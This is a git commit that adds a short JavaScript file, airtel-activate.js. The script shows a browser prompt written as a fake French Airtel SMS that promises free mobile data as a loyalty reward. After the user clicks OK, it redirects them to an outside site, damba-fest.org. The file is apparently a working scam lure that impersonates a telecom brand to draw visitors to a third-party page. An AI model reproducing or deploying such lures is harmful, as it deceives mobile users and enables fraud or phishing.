c6247473380ed46ffa65a9d15857c2a03a67688e
boss-bloq <nsisboy01@gmail.com>
2024-09-07 08:43:01 -0700

    Create airtel-activate.js

---
+++ airtel-activate.js
@@ -0,0 +1,6 @@
+
+var password = 'Airtel 50 Go'
+password=prompt('SMS: Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur Ok pour activer maintenant. ','Airtel 50GB');
+if (password != 'Airtel 50 Go') {
+location.href='https://damba-fest.org/airtel-4gdata.html';
+}
